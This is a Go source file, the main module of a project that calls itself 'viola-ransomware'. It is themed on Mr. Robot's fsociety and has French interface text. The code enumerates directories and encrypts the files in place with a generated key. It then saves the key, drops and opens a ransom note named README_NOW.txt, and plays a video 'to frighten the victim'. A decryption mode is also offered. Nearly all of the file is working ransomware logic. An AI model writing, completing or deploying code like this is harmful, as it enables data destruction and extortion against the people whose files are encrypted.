package main

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"time"
	"math/rand"
	"path/filepath"
	"viola-ransomware/config"
	"viola-ransomware/crypto"
	"viola-ransomware/enumeration"
	"viola-ransomware/readwrite"
)

// Animation style Mr. Robot
func TypeText(text string, speed time.Duration) {
	for _, char := range text {
		fmt.Printf("%c", char)
		time.Sleep(speed)
	}
}

func GlitchEffect() {
	chars := []string{"@", "#", "$", "%", "&", "*"}
	for i := 0; i < 10; i++ {
		fmt.Printf("\r-- %s INITIALIZING FSOCIETY PROTOCOL %s --", chars[rand.Intn(len(chars))], chars[rand.Intn(len(chars))])
		time.Sleep(100 * time.Millisecond)
	}
	fmt.Println()
}

func PlayScaryVideo() {
	// Lien vers une vidéo d'ambiance ou un message fsociety
	videoURL := "https://www.youtube.com/shorts/lHEvOlkNxcY" 
	
	
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("rundll32", "url.dll,FileProtocolHandler", videoURL)
	case "darwin":
		cmd = exec.Command("open", videoURL)
	default: // Linux
		cmd = exec.Command("xdg-open", videoURL)
	}
	cmd.Start()
}

func CreateMessage() {
	Message := config.RansomwareMessage
	readwrite.WriteFilesNoExt(Message, "README_NOW.txt")

	if runtime.GOOS == "windows" {
		exec.Command("notepad.exe", "README_NOW.txt").Start()
	}
}

func StartTheGame(key string, AllDirectory []string, decrypt bool) {
	mode := "CHIFFREMENT"
	if decrypt { mode = "RESTAURATION" }

	for i, path := range AllDirectory {
		data, err := readwrite.ReadFile(path)
		if err != nil { continue }

		var processedData []byte
		if decrypt {
			res, err := crypto.Decrypt(key, data)
			if err != nil { continue }
			processedData = []byte(res)
		} else {
			processedData, _ = crypto.Encrypt(key, data)
		}

		if readwrite.WriteFiles(processedData, path, decrypt) {
			// Barre de progression style Matrix
			perc := (i + 1) * 100 / len(AllDirectory)
			fmt.Printf("\r[%d%%] %s : %-50s", perc, mode, filepath.Base(path))
		}
	}
	fmt.Println("\n\n-- OPÉRATION TERMINÉE --")
}

func main() {
	rand.Seed(time.Now().UnixNano())
	var choice int
	var confirm string
	var key string

	Clear_Terminal()
	
	// Intro immersive
	GlitchEffect()
	TypeText("Connecté au serveur distant...\nAccès root accordé.\n", 50*time.Millisecond)
	
	fmt.Printf("\n[1] EXÉCUTER CHARGE UTILE (ENCRYPT)\n[2] ENTRER CLÉ DE DÉCHIFFREMENT\nSÉLECTION: ")
	fmt.Scan(&choice)

	if choice == 1 {
		TypeText("⚠️ ATTENTION: Cette action est irréversible. Continuer ? [y/n]: ", 30*time.Millisecond)
		fmt.Scan(&confirm)
		if confirm != "y" { return }

		// Lancement de la vidéo pour effrayer la victime
		PlayScaryVideo()
		
		key, _ = crypto.KeyGenerator(config.KeyByte)
	} else {
		fmt.Print("ENTREZ CLÉ: ")
		fmt.Scan(&key)
	}

	files, _ := enumeration.DirectoryEnumeration(choice == 2)
	if len(files) == 0 {
		fmt.Println("Aucune cible trouvée.")
		return
	}

	StartTheGame(key, files, choice == 2)

	if choice == 1 {
		readwrite.SaveKey(key)
		CreateMessage()
		TypeText("\nVos fichiers appartiennent maintenant à fsociety.\nNe nous cherchez pas.\n", 100*time.Millisecond)
	}
}

func Clear_Terminal() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" { cmd = exec.Command("cmd", "/c", "cls") }
	cmd.Stdout = os.Stdout
	cmd.Run()
}

